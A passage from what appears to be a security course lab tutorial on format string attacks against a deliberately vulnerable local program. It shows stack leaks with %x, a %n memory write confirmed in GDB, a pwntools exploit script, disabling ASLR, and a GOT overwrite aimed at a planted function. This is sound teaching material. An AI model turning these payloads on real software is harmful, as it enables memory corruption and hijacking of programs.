style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="transform-format-string-attack-to-a-memory-write">Transform Format String Attack to a Memory Write<a class="hash-link" href="#transform-format-string-attack-to-a-memory-write" title="Direct link to heading">​</a></h3><p>Any string that represents a useful format (e.g. <code>%d</code>, <code>%x</code> etc.) can be used to discover the vulnerability.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./format &quot;%08x %08x %08x %08x&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000 f759d4d3 00000002 ffd59bd4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This is the most useless and insecure program!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The values starting with <code>0xf...</code> are very likely pointers.
Again, we can use this vulnerability as a information leakage.
But we want more.</p><p>Another useful format for us is <code>%m$</code> followed by any normal format selector.
Which means that the <code>m</code>th parameter is used as an input for the following format.
<code>%10$08x</code> will print the <code>10</code>th parameter with <code>%08x</code>.
This allows us to do a precise access of the stack.</p><p>Example:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./format &quot;%08x %08x %08x %08x %1\$08x %2\$08x %3\$08x %4\$08x&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000 f760d4d3 00000002 ff9aca24 00000000 f760d4d3 00000002 ff9aca24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This is the most useless and insecure program!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Note the equivalence between formats.
Now, because we are able to select <em>any</em> higher address with this function and because the buffer is on the stack, sooner or later we will discover our own buffer.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./format &quot;$(python -c &#x27;print(&quot;%08x\n&quot; * 10000)&#x27;)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Depending on your setup you should be able to view the hex
representation of the string &quot;%08x<!-- -->\<!-- -->n&quot;.</p><p><strong>Why do we need our own buffer?</strong>
Remember the <code>%n</code> format?
It can be used to write at an address given as parameter.
The idea is to give this address as parameter and achieve memory writing.
We will see later how to control the value.</p><p>The next steps are done with ASLR disabled.
In order to disable ASLR, please run:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>By trial and error or by using GDB (breakpoint on <code>printf</code>) we can determine where the buffer starts:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./format &quot;$(python -c &#x27;import sys; sys.stdout.buffer.write(b&quot;ABCD&quot; + b&quot;%08x\n   &quot; * 0x300)&#x27;)&quot;  | grep -n 41 | head</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10:   ffffc410</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">52:   ffffcc41</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">72:   ffffcf41</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">175:   44434241</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Command-line Python exploits tend to get very tedious and hard to read when the payload gets more complex.
You can use the following reference pwntools script to write your exploit.
The code is equivalent to the above one-liner.</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">stack_items </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">200</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pad </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;ABCD&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">val_fmt </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;%08x\n   &quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># add a \n at the end for consistency with the command-line run</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fmt </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pad </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> val_fmt </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> stack_items </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\n&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">io </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;./format&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> fmt</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then call the <code>format</code> using:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python exploit.py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>One idea is to keep things in multiple of 4, like &quot;%08x <!-- -->\<!-- -->n&quot;.
If you are looking at line <code>175</code> we have <code>44434241</code> which is the base 16 representation of <code>ABCD</code> (because it&#x27;s little endian).
Note, you can add as many format strings you want, the start of the buffer will be the same (more or less).</p><p>We can compress our buffer by specifying the position of the argument.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./format $(python -c &#x27;import sys; sys.stdout.buffer.write(b&quot;ABCD&quot; + b&quot;AAAAAAAA&quot; * 199 + b&quot;%175$08x&quot;)&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ABCDAAAAAAAA...AAAAAAAAAAAAAAAAAAAAAAAAAAAA44434241</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This is the most useless and insecure program!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>b&quot;AAAAAAAA&quot; * 199</code> is added to maintain the length of the original string, otherwise the offset might change.</p><p>You can see that the last information is our <code>b&quot;ABCD&quot;</code> string printed with <code>%08x</code> this means that we know where our buffer is.</p><p>You need to enable core dumps in order to reproduce the steps below:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ulimit -c unlimited</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The steps below work an a given version of libc and a given system.
It&#x27;s why the instruction that causes the fault is</p><div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov %edx,(%eax)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>or the equivalent in Intel syntax</p><div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov DWORD PTR [eax], edx</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It may be different on your system, for example <code>edx</code> may be replaced by <code>esi</code>, such as</p><div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov DWORD PTR [eax], esi</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Update the explanations below accordingly.</p><p>Remove any core files you may have generated before testing your program:</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rm -f core</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can replace <code>%08x</code> with <code>%n</code> this should lead to segmentation fault.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./format &quot;$(python -c &#x27;import sys; sys.stdout.buffer.write(b&quot;ABCD&quot; + b&quot;AAAAAAAA&quot; * 199 + b&quot;%175$08n&quot;)&#x27;)&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Segmentation fault (core dumped)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ gdb ./format -c core</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Core was generated by `./format BCDEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program terminated with signal 11, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#0  0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) bt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#0  0xf7e580a2 in vfprintf () from /lib/i386-linux-gnu/libc.so.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#1  0xf7e5deff in printf () from /lib/i386-linux-gnu/libc.so.6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#2  0x08048468 in main (argc=2, argv=0xffffd2f4) at format.c:18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) x/i $eip</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=&gt; 0xf7e580a2 &lt;vfprintf+17906&gt;:    mov    %edx,(%eax)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) info registers $edx $eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">edx            0x202    1596</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eax            0x44434241   1145258561</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) quit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Bingo.
We have memory write.
The vulnerable code tried to write at the address <code>0x44434241</code> (<code>&quot;ABCD&quot;</code> little endian) the value 1596.
The value 1596 is the amount of data wrote so far by <code>printf(&quot;ABCD&quot; + 199 * &quot;AAAAAAAA&quot;)</code>.</p><p>Right now, our input string has 1605 bytes (1604 with a <code>n</code> at the end).
But we can further compress it, thus making the value that we write independent of the length of the input.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ ./format &quot;$(python -c &#x27;import sys; sys.stdout.buffer.write(&quot;ABCD&quot; + &quot;A&quot; * 1588 + &quot;%99x&quot; + &quot;%126$08n&quot;)&#x27;)&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Segmentation fault (core dumped)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ gdb ./format -c core</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) info registers $edx $eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">edx            0x261    1691</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eax            0x44434241   1145258561</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) quit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Here we managed to write <code>1691</code> (<code>4+1588+99</code>).
Note we should keep the number of bytes before the format string the same.
Which means that if we want to print with a padding of 100 (three digits) we should remove one <code>A</code>.
You can try this by yourself.</p><p><strong>How far can we go?</strong>
Probably we can use any integer for specifying the number of bytes which are used for a format, but we don&#x27;t need this;
moreover specifying a very large padding is not always feasible, think what happens when printing with <code>snprintf</code>.
<code>255</code> should be enough.</p><p>Remember, we want to write a value to a certain address.
So far we control the address, but the value is somewhat limited.
If we want to write 4 bytes at a time we can make use of the endianness of the machine.
<strong>The idea</strong> is to write at the address n and then at the address n+1 and so on.</p><p>Lets first display the address.
We are using the address <code>0x804c014</code>.
This address is the address of the got entry for the puts function.
Basically, we will override the got entry for the puts.</p><p>Check the <code>exploit.py</code> script from the task directory, read the commends and understand what it does.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ python exploit.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] &#x27;format&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Arch:     i386-32-little</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RELRO:    Partial RELRO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Stack:    No canary found</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NX:       NX enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PIE:      No PIE (0x8048000)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Starting local process &#x27;./format&#x27;: pid 29030</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Switching to interactive mode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Process &#x27;./format&#x27; stopped with exit code 0 (pid 29030)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">\x14\x04\x15\x04\x17\x04\x18\x04 804c014  804c015  804c017  804c018 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This is the most useless and insecure program!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The output starts with <code>\x14\x04\x15\x04\x17\x04\x18\x04 804c014  804c015  804c017  804c018</code> which is the 4 addresses we have written (raw, little endian) followed by the numerical prints done with <code>%x</code> of the same addresses.</p><p>If you have the same output it means that now, if you replace <code>%x</code> with <code>%n</code> (change <code>fmt = write_fmt</code> in the script) it will try to write something at those valid addresses.</p><p>We want to put the value <code>0x080491a6</code>.</p><div class="language-console codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-console codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ objdump -d ./format | grep my_evil</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">080491a6 &lt;my_evil_func&gt;:</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path 